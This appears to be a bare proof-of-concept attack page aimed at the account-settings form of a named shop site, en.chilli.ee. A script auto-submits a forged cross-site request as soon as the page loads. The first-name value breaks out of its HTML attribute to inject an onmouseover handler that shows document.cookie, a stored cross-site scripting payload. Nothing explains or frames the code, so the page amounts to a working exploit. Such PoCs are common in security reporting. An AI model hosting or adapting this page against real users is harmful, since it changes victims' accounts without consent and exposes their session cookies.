<body>
    <form method="post" action="https://en.chilli.ee/account/settings" class="form-horizontal" >

        <div class="settings-profile">
            <div class="well">
                <h3>Ostu seaded</h3>
        
                <div class="form-row">
                    <label for="eesnimi">First name</label>
        
                    <div class="form-field-group">
                        <input type="text" id="eesnimi" name="eesnimi" value="mostafa&#x22;onmouseover=&#x22;alert(document.cookie)" class="form-field">
                        
                    </div>
                </div>
        
                <div class="form-row">
                    <label for="perenimi">Last name</label>
        
                    <div class="form-field-group">
                        <input type="text" id="perenimi" name="perenimi" value="mahmoud" class="form-field">
                    </div>
                </div>
        
                <div class="form-row">
                    <label for="phone">Phone</label>
        
                    <div class="form-field-group">
                        <div class="input-group">
                            <div class="input-group-addon">+372</div>
                            <input type="text" id="telefon" name="telefon" value="010220330" class="form-field">
                        </div>
                    </div>
                </div>
        
                <div class="form-row">
                    <label>&nbsp;</label>
        
                    <div class="form-field-group">
                        <button type="submit" name="button" class="btn btn-green-primary">Salvesta seaded</button>
                    </div>
                </div>
        
            </div>
        </div>
        
        </form>
</body>
<script>
    document.forms[0].submit();
